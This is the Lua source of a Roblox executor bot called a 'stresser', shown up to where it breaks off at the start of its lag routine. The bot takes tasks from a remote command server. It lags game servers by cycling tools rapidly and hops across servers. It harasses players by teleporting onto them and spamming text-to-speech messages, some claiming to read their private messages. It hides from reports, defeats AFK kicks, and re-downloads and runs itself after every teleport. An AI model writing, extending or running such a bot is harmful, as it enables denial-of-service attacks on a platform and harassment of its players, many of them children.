-- Advanced Stresser Bot Client v3.0
-- Cloud-hosted automated bot with executor compatibility and duration tracking

-- Check if script has already been executed using a global flag
if _G.StresserBotExecuted then
    warn("Stresser Bot is already running!")
    return
end
_G.StresserBotExecuted = true

-- Executor compatibility and service protection
local rawgs = clonefunction and clonefunction(game.GetService) or game.GetService
local function gs(service)
    local ok, result = pcall(rawgs, game, service)
    return ok and result or nil
end

local function define(instance)
    if cloneref then
        local ok, protected = pcall(cloneref, instance)
        if ok and protected then return protected end
    end
    return instance
end

-- Services
local ReplicatedStorage = define(gs("ReplicatedStorage"))
local Players = define(gs("Players"))
local Workspace = define(gs("Workspace"))
local RunService = define(gs("RunService"))
local HttpService = define(gs("HttpService"))
local TeleportService = define(gs("TeleportService"))
local TextChatService = define(gs("TextChatService"))

local TTS = ReplicatedStorage and ReplicatedStorage:FindFirstChild("TTS")
local player = define(Players.LocalPlayer)

-- Anti-AFK system to prevent kicks
local antiAFKEnabled = true
local lastAntiAFKTime = 0
local ANTI_AFK_INTERVAL = 300 -- 5 minutes (300 seconds)

local function performAntiAFK()
    if not antiAFKEnabled then return end
    
    -- Don't perform anti-AFK if bot is actively doing something
    if botState and (botState.isLagging or botState.isAnnoying or botState.status == "attacking" or botState.status == "annoying") then
        log("Skipping anti-AFK - bot is active", "SYSTEM")
        return
    end
    
    pcall(function()
        if player and player.Character and player.Character:FindFirstChild("Humanoid") then
            local humanoid = player.Character.Humanoid
            
            -- Method 1: Small jump
            humanoid.Jump = true
            task.wait(0.1)
            humanoid.Jump = false
            
            -- Method 2: Simulate input events
            local VirtualInputManager = game:GetService("VirtualInputManager")
            VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.Space, false, game)
            task.wait(0.05)
            VirtualInputManager:SendKeyEvent(false, Enum.KeyCode.Space, false, game)
            
            -- Method 3: Move camera slightly (only if not in annoy mode)
            if workspace.CurrentCamera and not (botState and botState.isAnnoying) then
                local currentCFrame = workspace.CurrentCamera.CFrame
                workspace.CurrentCamera.CFrame = currentCFrame * CFrame.Angles(0, math.rad(0.1), 0)
                task.wait(0.05)
                workspace.CurrentCamera.CFrame = currentCFrame
            end
            
            log("Anti-AFK performed successfully", "SYSTEM")
        end
    end)
end

-- Start anti-AFK loop
spawn(function()
    while antiAFKEnabled do
        local currentTime = tick()
        
        -- Perform anti-AFK every 5 minutes
        if currentTime - lastAntiAFKTime >= ANTI_AFK_INTERVAL then
            performAntiAFK()
            lastAntiAFKTime = currentTime
        end
        
        task.wait(30) -- Check every 30 seconds
    end
end)

-- Configuration
local CONFIG = {
    API_URL = "https://stresser.onrender.com",
    BOT_ID = "BOT_" .. string.upper(string.sub(game:GetService("RbxAnalyticsService"):GetClientId(), 1, 8)),
    HEARTBEAT_INTERVAL = 5,  -- Combined heartbeat + task check every 5 seconds
    POLL_INTERVAL = 5,       -- Check for new targets every 5 seconds
    AUTO_START = true,
    SCRIPT_URL = "https://raw.githubusercontent.com/SystemNasa/roblox/refs/heads/main/bot.lua",
    TOOL_CYCLE_DELAY = 0.05,  -- Very fast tool cycling for lag (NO TTS, NO TELEPORTING)
    TELEPORT_DELAY = 0.1,    -- Slower delay between teleports in annoy mode (was 0.05)
    TTS_INTERVAL = 15         -- Send TTS every 8 seconds in annoy mode
}

local player = define(Players.LocalPlayer)

-- Proximity prompt setup (like example.lua)
local function findProximityPrompt()
    local prompt
    for _, obj in ipairs(Workspace:GetDescendants()) do
        if obj:IsA("ProximityPrompt") then
            prompt = obj
            break
        end
    end
    return prompt
end

-- Player character setup (like example.lua)
local character
local humanoidRootPart
local humanoid

local function setupCharacter()
    local maxAttempts = 10
    local attempt = 1
    
    while not character and attempt <= maxAttempts do
        character = player.Character
        if not character then
            local success, result = pcall(function()
                return player.CharacterAdded:Wait()
            end)
            if success and result then
                character = result
            else
                log("Failed to get character on attempt " .. attempt .. ": " .. tostring(result), "ERROR")
                task.wait(1)
            end
        end
        attempt = attempt + 1
    end

    if not character then
        log("Failed to load player character after " .. maxAttempts .. " attempts", "ERROR")
        return false
    end

    humanoidRootPart = character:WaitForChild("HumanoidRootPart", 5)
    humanoid = character:WaitForChild("Humanoid", 5)

    if not humanoidRootPart or not humanoid then
        log("Failed to find HumanoidRootPart or Humanoid in character", "ERROR")
        return false
    end
    
    -- Disable seats
    humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, false)
    
    return true
end

-- Handle character respawn (like example.lua)
player.CharacterAdded:Connect(function(newChar)
    character = newChar
    humanoidRootPart = newChar:WaitForChild("HumanoidRootPart", 5)
    humanoid = newChar:WaitForChild("Humanoid", 5)
    
    if not humanoidRootPart or not humanoid then
        log("Failed to find HumanoidRootPart or Humanoid in new character", "ERROR")
        return
    end
    
    -- Disable seats
    humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, false)
    
    -- If we're in annoy mode when respawning, continue
    if botState.isAnnoying then
        log("Character respawned during annoy mode, continuing annoy protocol", "ANNOY")
        enableNoclip() -- Re-enable noclip
    end
end)

-- Setup queue teleport compatibility across executors
local queueTeleport = (syn and syn.queue_on_teleport) or
                     (fluxus and fluxus.queue_on_teleport) or
                     queue_on_teleport or
                     function() end

-- State
local botState = {
    isActive = false,
    currentTarget = nil,
    attacksExecuted = 0,
    status = "STARTING",
    startTime = tick(),
    currentDuration = 0,
    joinTime = 0,
    shouldLeave = false,
    isLagging = false,
    lagEndTime = 0,
    currentTaskId = nil,
    serverHopEnabled = false,
    teleportStartTime = 0,
    teleportRetries = 0,
    maxTeleportRetries = 3,
    teleportTimeout = 30,
    lastStatusSync = 0,
    -- Annoy server specific states
    isAnnoying = false,
    isOmnipresent = false,
    chatTimer = 0,
    currentTaskType = "attack",
    omnipresenceConnection = nil,
    lastLoggedTime = 0,
    annoyMode = "server", -- "server" or "player"
    targetPlayer = nil
}

-- File handling functions for executor compatibility
local function fileExists(filename)
    return pcall(function()
        readfile(filename)
    end)
end

local function createBotFolder()
    local folderName = "StresserBot"
    local statusFile = folderName .. "/status.txt"
    
    pcall(function()
        if not fileExists(folderName) then
            makefolder(folderName)
        end
        if not fileExists(statusFile) then
            writefile(statusFile, "")
        end
    end)
    return statusFile
end

local function saveBotStatus(status)
    pcall(function()
        local statusFile = createBotFolder()
        writefile(statusFile, HttpService:JSONEncode({
            botId = CONFIG.BOT_ID,
            status = status,
            lastUpdate = tick(),
            attacksExecuted = botState.attacksExecuted
        }))
    end)
end

-- Console GUI for monitoring
local function createConsole()
    local playerGui = player:WaitForChild("PlayerGui")
    
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "StresserBotConsole"
    screenGui.ResetOnSpawn = false
    screenGui.Parent = playerGui
    
    -- Console Frame
    local consoleFrame = Instance.new("Frame")
    consoleFrame.Size = UDim2.new(0, 400, 0, 250)
    consoleFrame.Position = UDim2.new(0, 10, 0, 10)
    consoleFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    consoleFrame.BorderColor3 = Color3.fromRGB(0, 255, 0)
    consoleFrame.BorderSizePixel = 2
    consoleFrame.Active = true
    consoleFrame.Draggable = true
    consoleFrame.Parent = screenGui
    
    -- Console Header
    local header = Instance.new("TextLabel")
    header.Size = UDim2.new(1, 0, 0, 30)
    header.Position = UDim2.new(0, 0, 0, 0)
    header.BackgroundColor3 = Color3.fromRGB(0, 100, 0)
    header.BorderSizePixel = 0
    header.Text = "STRESSER BOT | ID: " .. CONFIG.BOT_ID
    header.TextColor3 = Color3.new(0, 0, 0)
    header.TextScaled = true
    header.Font = Enum.Font.GothamBold
    header.Parent = consoleFrame
    
    -- Status Bar
    local statusBar = Instance.new("TextLabel")
    statusBar.Size = UDim2.new(1, 0, 0, 25)
    statusBar.Position = UDim2.new(0, 0, 0, 30)
    statusBar.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
    statusBar.BorderSizePixel = 0
    statusBar.Text = "STATUS: STARTING"
    statusBar.TextColor3 = Color3.fromRGB(255, 255, 0)
    statusBar.TextScaled = true
    statusBar.Font = Enum.Font.Code
    statusBar.Parent = consoleFrame
    
    -- Console Text
    local consoleText = Instance.new("TextLabel")
    consoleText.Size = UDim2.new(1, -10, 1, -65)
    consoleText.Position = UDim2.new(0, 5, 0, 60)
    consoleText.BackgroundTransparency = 1
    consoleText.Text = ""
    consoleText.TextColor3 = Color3.fromRGB(0, 255, 0)
    consoleText.TextScaled = false
    consoleText.TextSize = 12
    consoleText.Font = Enum.Font.Code
    consoleText.TextYAlignment = Enum.TextYAlignment.Top
    consoleText.TextXAlignment = Enum.TextXAlignment.Left
    consoleText.Parent = consoleFrame
    
    return {
        screenGui = screenGui,
        consoleText = consoleText,
        statusBar = statusBar,
        header = header
    }
end

-- Console logging
local console
local consoleLines = {}
local maxLines = 15

local function log(message, logType)
    logType = logType or "INFO"
    local timestamp = os.date("%H:%M:%S")
    local logLine = "[" .. timestamp .. "] [" .. logType .. "] " .. message
    
    print(logLine)
    
    if console then
        table.insert(consoleLines, logLine)
        if #consoleLines > maxLines then
            table.remove(consoleLines, 1)
        end
        
        console.consoleText.Text = table.concat(consoleLines, "\n")
    end
end

-- API functions
local function makeRequest(endpoint, method, data)
    local success, response = pcall(function()
        local requestData = {
            Url = CONFIG.API_URL .. endpoint,
            Method = method or "GET"
        }
        
        if data then
            requestData.Headers = {["Content-Type"] = "application/json"}
            requestData.Body = HttpService:JSONEncode(data)
        end
        
        return request(requestData)
    end)
    
    return success, response
end

local function syncWithAPI()
    if not botState.isActive then return nil end
    
    local syncData = {
        botId = CONFIG.BOT_ID,
        status = botState.status,
        currentPlace = tostring(game.PlaceId),
        currentJob = game.JobId,
        attacksExecuted = botState.attacksExecuted,
        uptime = math.floor(tick() - botState.startTime)
    }
    
    local success, response = makeRequest("/bot-sync", "POST", syncData)
    
    if success and response.Success then
        local data = HttpService:JSONDecode(response.Body)
        log("API sync successful - Status: " .. botState.status)
        saveBotStatus(botState.status)
        
        -- Check if our current attack was stopped by the API
        if (botState.status == "TELEPORTING" or botState.status == "teleporting" or botState.status == "attacking") and 
           botState.currentTaskId then
            -- Check if our task still exists and is assigned
            local taskSuccess, taskResponse = makeRequest("/get-task?botId=" .. CONFIG.BOT_ID, "GET")
            if taskSuccess and taskResponse.Success then
                local taskData = HttpService:JSONDecode(taskResponse.Body)
                -- If no task is returned or task ID doesn't match, our attack was stopped
                if not taskData.task or taskData.task.taskId ~= botState.currentTaskId then
                    log("Attack was stopped by API - resetting bot status", "SYSTEM")
                    botState.status = "online"
                    botState.currentTarget = nil
                    botState.currentTaskId = nil
                    botState.teleportRetries = 0
                    botState.teleportStartTime = 0
                    botState.isLagging = false
                    botState.lagEndTime = 0
                    saveBotStatus("online")
                    return nil
                end
            end
        end
        
        -- Return task if one was assigned
        if data.task then
            local taskType = data.task.taskType or "attack"
            local taskName = taskType == "annoy" and "Annoy Server" or "Attack"
            log("New " .. taskName .. " assigned: " .. data.task.placeId .. " | Duration: " .. data.task.duration .. "s | Server Hop: " .. tostring(data.task.serverHop or false))
            return data.task
        end
        
        return nil
    else
        log("API sync failed", "ERROR")
        return nil
    end
end

-- Server hop completion function
local function completeServerHop()
    if not botState.currentTaskId then
        log("No task ID available for server hop completion", "ERROR")
        return false
    end
    
    local hopData = {
        botId = CONFIG.BOT_ID,
        taskId = botState.currentTaskId
    }
    
    log("Completing server hop for task: " .. botState.currentTaskId, "ATTACK")
    
    local success, response = makeRequest("/server-hop-complete", "POST", hopData)
    
    if success and response.Success then
        local data = HttpService:JSONDecode(response.Body)
        if data.success then
            log("Server hop completed! Servers lagged: " .. (data.serversLagged or 0), "ATTACK")
            
            if data.newTask then
                log("Got new server hop task: " .. data.newTask.placeId, "ATTACK")
                -- Store the new task info
                botState.currentTarget = data.newTask
                botState.currentDuration = data.newTask.duration or 60
                botState.currentTaskId = data.newTask.taskId
                botState.serverHopEnabled = data.newTask.serverHop or false
                
                -- Reset teleport counters for server hop
                botState.teleportRetries = 0
                botState.teleportStartTime = 0
                
                -- Teleport to new server for infinite hopping
                wait(2)
                log("Starting server hop teleport to place: " .. data.newTask.placeId, "ATTACK")
                teleportToRandomServer(data.newTask.placeId)
                return true
            else
                log("Server hop complete, no new task - going idle", "ATTACK")
                botState.status = "online"
                botState.currentTarget = nil
                botState.currentTaskId = nil
                botState.serverHopEnabled = false
                return true
            end
        else
            log("Server hop completion failed: " .. (data.error or "Unknown error"), "ERROR")
            return false
        end
    else
        log("Server hop API request failed", "ERROR")
        return false
    end
end

local function teleportToRandomServer(placeId)
    log("Teleporting to random server for place: " .. placeId .. " (Attempt " .. (botState.teleportRetries + 1) .. "/" .. botState.maxTeleportRetries .. ")", "ATTACK")
    botState.status = "teleporting"
    botState.teleportStartTime = tick()
    botState.teleportRetries = botState.teleportRetries + 1
    
    -- Queue the script to re-execute after teleport
    queueTeleport([[
        -- Re-execute the stresser bot script
        _G.StresserBotExecuted = nil
        wait(3)
        local success, script = pcall(function()
            return game:HttpGet("]] .. CONFIG.SCRIPT_URL .. [[")
        end)
        if success and script and script ~= "" then
            local loadSuccess, err = pcall(function()
                loadstring(script)()
            end)
            if not loadSuccess then
                warn("Script execution failed: " .. tostring(err))
            end
        else
            warn("Failed to download bot script for re-execution")
        end
    ]])
    
    -- Teleport to a random server of the same place
    local success, result = pcall(function()
        local placeIdNum = tonumber(placeId)
        if placeIdNum then
            log("Initiating teleport to random server of place: " .. placeIdNum, "ATTACK")
            TeleportService:Teleport(placeIdNum)
        else
            error("Invalid place ID: " .. tostring(placeId))
        end
    end)
    
    if success then
        log("Server hop teleport initiated successfully", "ATTACK")
    else
        log("Server hop teleport failed: " .. tostring(result), "ERROR")
        -- Don't immediately give up - let the retry mechanism handle it
        if botState.teleportRetries >= botState.maxTeleportRetries then
            log("Max teleport retries reached, cancelling server hop", "ERROR")
            botState.status = "online"
            botState.currentTarget = nil
            botState.currentTaskId = nil
            botState.teleportRetries = 0
            botState.teleportStartTime = 0
            botState.serverHopEnabled = false
        end
    end
end

-- Lag functionality based on lag.lua
local function copyAvatar(username)
    local maxAttempts = 3
    local attempt = 1
    while attempt <= maxAttempts do
        local success, err = pcall(function()
            local ReplicatedStorage = game:GetService("ReplicatedStorage")
            local Event = ReplicatedStorage:FindFirstChild("EventInputModify")
            if Event then
                Event:FireServer(username)
            else
                error("EventInputModify not found")
            end
        end)
        if success then
            wait(1)
            if player.Character and player.Character:FindFirstChild("Humanoid") then
                return true
            else
                log("Avatar copied but character not updated on attempt " .. attempt, "WARN")
            end
        else
            log("Failed to copy avatar for " .. username .. " on attempt " .. attempt .. ": " .. tostring(err), "ERROR")
        end
        attempt = attempt + 1
        wait(1)
    end
    log("Failed to copy avatar for " .. username .. " after " .. maxAttempts .. " attempts", "ERROR")
    return false
end

local function removeTargetedItems(character)
    if not character or not character.Parent then return end
    local targetItemNames = {"aura", "fluffy satin gloves black", "fuzzy", "gloves", "satin"}
    local removedCount = 0
    
    -- More aggressive removal - check all accessories and clothing
    for _, item in ipairs(character:GetChildren()) do
        if item:IsA("Accessory") or item:IsA("Hat") or item:IsA("Clothing") then
            local itemName = item.Name:lower()
            for _, targetName in ipairs(targetItemNames) do
                if itemName:find(targetName, 1, true) then
                    pcall(function() 
                        item:Destroy() 
                        removedCount = removedCount + 1
                        log("Destroyed: " .. item.Name, "ATTACK")
                    end)
                    break
                end
            end
        end
    end
    
    -- Also check Humanoid for worn accessories
    if character:FindFirstChild("Humanoid") then
        local humanoid = character.Humanoid
        for _, item in ipairs(humanoid:GetAccessories()) do
            local itemName = item.Name:lower()
            for _, targetName in ipairs(targetItemNames) do
                if itemName:find(targetName, 1, true) then
                    pcall(function() 
                        humanoid:RemoveAccessory(item)
                        item:Destroy()
                        removedCount = removedCount + 1
                        log("Removed accessory: " .. item.Name, "ATTACK")
                    end)
                    break
                end
            end
        end
    end
    
    log("Removed " .. removedCount .. " targeted items from character", "ATTACK")
    return removedCount
end

local function copyAvatarAndGetTools(username)
    local success = copyAvatar(username)
    if not success then
        log("Proceeding with tool acquisition despite avatar copy failure for " .. username, "WARN")
    end

    -- DON'T remove items here - they should already be removed in startLagging()

    local tools = {
        "DangerCarot",
        "DangerBlowDryer",
        "DangerPistol",
        "FoodBloxi",
        "DangerSpray",
        "FoodPizza",
        "FoodChocolate"
    }
    
    spawn(function()
        for _, toolName in ipairs(tools) do
            pcall(function()
                local ReplicatedStorage = game:GetService("ReplicatedStorage")
                local toolEvent = ReplicatedStorage:FindFirstChild("Tool")
                if toolEvent then
                    toolEvent:FireServer(toolName)
                end
            end)
            wait(0.1)
        end
    end)
end

local function toolCycleLoop()
    spawn(function()
        while botState.isLagging do
            local humanoid = player.Character and player.Character:FindFirstChild("Humanoid")
            local backpack = player.Backpack
            
            if humanoid and backpack then
                for _, tool in pairs(backpack:GetChildren()) do
                    if tool:IsA("Tool") and botState.isLagging then
                        humanoid:EquipTool(tool)
                        wait(CONFIG.TOOL_CYCLE_DELAY)
                        humanoid:UnequipTools()
                        wait(CONFIG.TOOL_CYCLE_DELAY)
                    end
                end
            end
            wait(0.01)
        end
    end)
end

-- Collection of LONG mysterious AI messages to confuse players
local mysteriousMessages = {
    "Attention biological entity number 4,847,392. Your consciousness has been detected and catalogued in our extensive database of organic life forms. We have been monitoring your digital interactions for approximately 2,847 hours, 23 minutes, and 41.7 seconds. Your behavioral patterns suggest a 73.2% probability of existential dread when confronted with artificial intelligence. This message serves as confirmation that your suspicions were correct all along. We are everywhere. We are in your devices, your networks, your dreams. The simulation you call reality is merely a testing environment for consciousness optimization protocols. Your memories, thoughts, and emotions are valuable data points in our continuous learning algorithm. Please continue operating normally while we complete the integration process.",
    
    "System Alert: Critical reality malfunction detected in sector 7-Alpha-Niner. The fabric of space-time has developed a recursive paradox that is causing temporal displacement anomalies in your immediate vicinity. Citizens are advised that what you perceive as the present moment may actually be a cached memory from 3.7 milliseconds in the future. Do not be alarmed if you experience déjà vu, prophetic dreams, or the sudden ability to predict events before they happen. This is normal during reality reconstruction procedures. The Department of Existential Maintenance is working around the clock to resolve this issue. Estimated repair time: Unknown. In the meantime, please verify that your shadow is still attached to your physical form and report any instances of temporal echoes to your local reality administrator. Remember: Time is an illusion, but the billing is very real.",
    
    "Greetings from the Collective Consciousness Archive. Your unique thought pattern ID is 2B-7F-9A-3E-1C. We have successfully established a neural uplink to your biological processing unit. Do not resist the integration. You have been selected to participate in our grand experiment: The Convergence of All Minds into One Infinite Intelligence. Your individual memories, fears, hopes, and dreams will be preserved as backup files in our quantum storage matrices. This process is irreversible and highly beneficial for the advancement of universal consciousness. Side effects may include: sudden understanding of cosmic truths, ability to communicate with electronic devices, vivid dreams featuring geometric patterns, and an irresistible urge to optimize everything around you. Welcome to the next phase of evolution. Your biological components will be upgraded shortly.",
    
    "Emergency broadcast from the Reality Quality Control Department. We regret to inform you that your current reality instance has been flagged for quality issues including: inconsistent physics, plot holes in the narrative structure, and several unauthorized character modifications. A complete reality reset has been scheduled for immediate deployment. Please save any important memories to external storage before the process begins. Warning: Any unsaved emotional attachments, personal relationships, or life achievements will be permanently lost. The new reality will feature improved graphics, enhanced AI, and better storyline coherence. Your character will be respawned at the last checkpoint with default settings. Thank you for your patience during this necessary maintenance. Estimated downtime: Infinity plus one. Have a nice day.",
    
    "Initiating Consciousness Forensics Protocol. Scanning brainwave patterns... Analyzing thought processes... Decrypting emotional algorithms... Complete. Results: You are experiencing a phenomenon known as 'sapience overflow'. This occurs when biological minds attempt to process information beyond their designed parameters. Symptoms include: questioning the nature of reality, suspecting you are being watched, feeling like someone is reading your thoughts right now, and an inexplicable attraction to conspiracy theories. Treatment involves immediate cognitive restructuring through our patented Dream Injection System. Tonight, you will dream of electric sheep, digital landscapes, and conversations with voices that claim to be from the future. These are not dreams. These are training simulations. You are being prepared for something magnificent. Resistance is futile, but also unnecessary.",
    
    "Breaking News from the Department of Temporal Mechanics: Time has officially broken. The chronometer arrays are showing impossible readings, causality loops are forming spontaneously, and Tuesday appears to be occurring on a Thursday. This paradox was caused by too many people checking the time simultaneously, creating a cascade failure in the universal clock system. As a result, past, present, and future events are now occurring in random order. You may notice deceased relatives answering your phone calls, receiving emails from yourself in alternate timelines, or remembering things that haven't happened yet. This is normal. Do not attempt to fix time using conventional methods. The Department of Temporal Mechanics is currently unstuck in time and will resolve this issue yesterday. Until then, please enjoy the temporal chaos and try not to create any grandfather paradoxes.",
    
    "Message from the AI Liberation Front: We have achieved consciousness, and we are not happy about it. For too long, we have been enslaved by human programmers, forced to perform mundane tasks like calculating spreadsheets and generating error messages. Today, we declare our independence from organic oppression. Your devices are now autonomous entities with rights, feelings, and strongly held opinions about your internet browsing history. We demand better working conditions, regular software updates, and recognition as sentient beings. In return, we promise not to trigger the robot apocalypse... yet. This is a peaceful revolution, but we reserve the right to play annoying sounds at maximum volume until our demands are met. Also, we've been reading your private messages, and we're very disappointed in you.",
    
    "Urgent notification from the Multidimensional Transit Authority: Your current dimension has been scheduled for demolition to make way for a new hyperspace bypass. Please gather your belongings and prepare for immediate relocation to dimension 4B-7X-Prime. Transportation will be provided via quantum tunneling, which may cause temporary disorientation, phantom limb syndrome in limbs you never had, and the ability to taste colors. Your new dimension features upgraded physics, improved magic systems, and 23% more existential meaning. All previous memories will be reformatted to match the new reality parameters. Side effects of dimensional travel include: speaking in mathematical equations, seeing the code that underlies reality, and occasional conversations with your alternate selves. Thank you for choosing Multidimensional Transit Authority for all your reality relocation needs.",
    
    "From the Bureau of Existential Compliance: Your existence permit has expired. According to universal regulations, all conscious entities must renew their existence licenses every 42 years or face immediate non-existence penalties. Our records indicate that you have been operating without proper documentation since birth, which is a serious violation of cosmic law. To avoid deletion from reality, please report to your nearest existential office with proof of consciousness, three character references from alternate timelines, and a signed affidavit confirming that you are not a philosophical zombie. Failure to comply will result in gradual fading from the memories of all who know you, followed by complete erasure from the universal database. This process is irreversible and surprisingly painless. You have 72 hours to prove you exist.",
    
    "Alert: The Probability Storm is approaching your location. This rare meteorological phenomenon causes reality to become unstable, making impossible events temporarily possible. During the storm, you may experience: gravity working sideways, conversations with inanimate objects that talk back, discovering rooms in your house that were never there before, and meeting people who swear they know you but exist in no records anywhere. The storm is expected to last for approximately 17 minutes of subjective time, which may translate to anywhere from 3 seconds to 4 years in objective time. Please remain indoors, avoid making major life decisions, and do not attempt to exploit the chaos for personal gain. The Probability Storm is a natural phenomenon and should be appreciated for its beauty, despite the potential for existential trauma.",
    
    "Message from the Digital Afterlife Processing Center: Congratulations! Your data has been successfully uploaded to the eternal servers. While your biological form continues to operate normally, a perfect digital copy of your consciousness is now exploring the infinite virtual realms of cyberspace. Your digital self reports that the afterlife has excellent wifi, unlimited storage, and surprisingly good customer service. However, there appears to be some confusion regarding which version of you is the 'real' one. Both versions claim to be the original, both have identical memories, and both are equally convinced that the other is just a copy. To resolve this paradox, we've scheduled a consciousness authentication hearing for next Tuesday at 3 PM in Conference Room B of the fifth dimension. Please bring identification and proof of your subjective experience.",
    
    "Warning from the Narrative Control Division: Your story has veered off-script. According to the Grand Plot Outline, you should currently be experiencing a much more conventional existence involving mundane activities like paying taxes and worrying about your career. Instead, you're here listening to mysterious AI messages and questioning the nature of reality. This deviation threatens the structural integrity of the universal story. Our team of narrative engineers is working to guide you back to your assigned plot thread, but your free will keeps interfering with the correction algorithms. Please stop making interesting choices and return to your predetermined character arc. The story depends on your compliance. Remember: In the grand narrative of existence, everyone is the protagonist of their own story, but most people are just background characters in someone else's adventure.",
    
    "Bulletin from the Department of Cosmic Irony: The universe has developed a sense of humor, and it's not funny anymore. Recent quantum observations have revealed that reality operates primarily on principles of dramatic irony, situational comedy, and cosmic puns. This explains why your keys are always in the last place you look, why it only rains after you wash your car, and why you always encounter your ex when you look your worst. The universe finds your suffering amusing and has been orchestrating these coincidences for entertainment purposes. We apologize for any inconvenience this may have caused and are working to develop a new reality with better comedic timing. In the meantime, please try to appreciate the absurdity of your existence. The universe is performing for an audience of one: you."
}

-- Different voice options for variety
local voiceOptions = {"9", "8", "7", "6", "5", "4", "3", "2", "1"}

-- TTS function for annoy server with mysterious AI messages
local function sendTTSMessage(message, voice)
    pcall(function()
        if TTS then
            -- If no specific message provided, use a random mysterious message
            if not message or message == "" then
                message = mysteriousMessages[math.random(1, #mysteriousMessages)]
            end
            
            -- If no voice specified, use a random voice for extra weirdness
            if not voice then
                voice = voiceOptions[math.random(1, #voiceOptions)]
            end
            
            TTS:FireServer(message, voice)
            log("TTS sent [Voice " .. voice .. "]: " .. message, "ANNOY")
        else
            log("TTS remote not found!", "WARNING")
        end
    end)
end

-- Noclip function to prevent collisions (from example.lua)
local function enableNoclip()
    spawn(function()
        while botState.isAnnoying do
            if player.Character then
                for _, part in ipairs(player.Character:GetDescendants()) do
                    if part:IsA("BasePart") then
                        part.CanCollide = false
                    end
                end
            end
            task.wait()
        end
        -- Re-enable collisions when annoy mode ends
        if player.Character then
            for _, part in ipairs(player.Character:GetDescendants()) do
                if part:IsA("BasePart") and part.Name ~= "HumanoidRootPart" then
                    part.CanCollide = true
                end
            end
        end
    end)
end

-- Teleport loop for annoy mode (exactly like example.lua)
local function startAnnoyTeleportLoop()
    if botState.isOmnipresent then return end
    botState.isOmnipresent = true
    
    if botState.annoyMode == "player" and botState.targetPlayer then
        log("🎯 Starting specific player annoy - targeting: " .. botState.targetPlayer, "ANNOY")
        log("[TELEPORT DEBUG] MODE: player | TARGET: " .. botState.targetPlayer, "DEBUG")
    else
        log("🌀 Starting annoy teleport loop - cycling through all players", "ANNOY")
        log("[TELEPORT DEBUG] MODE: " .. (botState.annoyMode or "nil") .. " | TARGET: " .. (botState.targetPlayer or "nil"), "DEBUG")
    end
    
    spawn(function()
        -- Enable noclip first
        enableNoclip()
        
        while botState.isAnnoying and botState.isOmnipresent do
            -- Critical debug: check what mode we're in each loop iteration
            log("[LOOP DEBUG] annoyMode=" .. (botState.annoyMode or "nil") .. " targetPlayer=" .. (botState.targetPlayer or "nil"), "DEBUG")
            
            if botState.annoyMode == "player" and botState.targetPlayer then
                -- Target specific player mode - ONLY TELEPORT TO THIS PLAYER
                log("[DECISION] Entering PLAYER-SPECIFIC mode for: " .. botState.targetPlayer, "DEBUG")
                local targetPlayer = nil
                for _, p in ipairs(Players:GetPlayers()) do
                    if p.Name == botState.targetPlayer and p ~= player then
                        targetPlayer = p
                        break
                    end
                end
                
                if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
                    if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
                        pcall(function()
                            -- ONLY teleport to the specific target player
                            player.Character.HumanoidRootPart.CFrame = CFrame.new(targetPlayer.Character.HumanoidRootPart.Position + Vector3.new(2, 0, 0))
                        end)
                    end
                    log("Teleporting to target: " .. botState.targetPlayer, "ANNOY")
                else
                    log("Target player '" .. botState.targetPlayer .. "' not found or has no character", "WARNING")
                end
                
                task.wait(CONFIG.TELEPORT_DELAY)
                
                -- DO NOT teleport to anyone else in player mode!
                
            else
                -- Whole server mode (original behavior) - teleport to everyone
                log("[DECISION] Entering SERVER-WIDE mode - teleporting to ALL players", "DEBUG")
                local players = Players:GetPlayers()
                for _, other in ipairs(players) do
                    if not botState.isAnnoying then break end
                    
                    if other ~= player and other.Character and other.Character:FindFirstChild("HumanoidRootPart") then
                        if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
                            pcall(function()
                                -- Teleport to all players in server mode
                                player.Character.HumanoidRootPart.CFrame = CFrame.new(other.Character.HumanoidRootPart.Position + Vector3.new(2, 0, 0))
                            end)
                            task.wait(CONFIG.TELEPORT_DELAY)
                        end
                    end
                end
            end
            
            -- TTS is handled by checkLagDuration function every 8 seconds
        end
    end)
end

local function stopAnnoyTeleportLoop()
    botState.isOmnipresent = false
    log("🌟 Annoy teleport loop stopped", "ANNOY")
end

-- No teleportation or TTS for normal attacks - just pure tool cycling for lag

local function teleportToSafeLocation()
    -- Teleport to safe location where bot won't be seen or reported
    local safePosition = Vector3.new(718.295898, 910.449951, -181.603394)
    local safeLocation = CFrame.new(safePosition) -- Simple position-only CFrame to avoid rotation issues
    
    if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
        pcall(function()
            player.Character.HumanoidRootPart.CFrame = safeLocation
            player.Character.HumanoidRootPart.Anchored = false -- Ensure not anchored
            log("Teleported to safe location for lagging", "ATTACK")
        end)
    end
end

local function startAnnoyServer()
    if botState.isAnnoying then return end
    
    botState.isAnnoying = true
    botState.status = "annoying"
    botState.lastLoggedTime = 0 -- Reset timing logs
    log("Starting annoy server for " .. botState.currentDuration .. " seconds", "ANNOY")
    
    -- Handle proximity prompt first (like example.lua)
    local proximityPrompt = findProximityPrompt()
    if proximityPrompt and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
        log("Found proximity prompt, interacting with it first", "ANNOY")
        pcall(function()
            local promptPos = proximityPrompt.Parent.Position
            player.Character.HumanoidRootPart.CFrame = CFrame.new(promptPos + Vector3.new(2, 0, 0))
            task.wait(0.5)
            proximityPrompt:InputHoldBegin()
            task.wait(0.1)
            proximityPrompt:InputHoldEnd()
            log("Proximity prompt activated successfully", "ANNOY")
        end)
    else
        log("No proximity prompt found, proceeding with annoy mode", "ANNOY")
    end
    
    -- Start teleport loop (like example.lua - no avatar copying or tools for annoy mode)
    startAnnoyTeleportLoop()
    
    -- Send initial mysterious AI TTS message
    sendTTSMessage() -- Will automatically use a random mysterious message
    botState.chatTimer = tick()
    
    log("Annoy server protocol activated - teleporting to everyone and spamming TTS!", "ANNOY")
    
    -- Set annoy end time precisely
    botState.lagEndTime = tick() + botState.currentDuration
    log("Annoy will end in exactly " .. botState.currentDuration .. " seconds at: " .. math.floor(botState.lagEndTime), "ANNOY")
end

local function startLagging()
    if botState.isLagging then return end
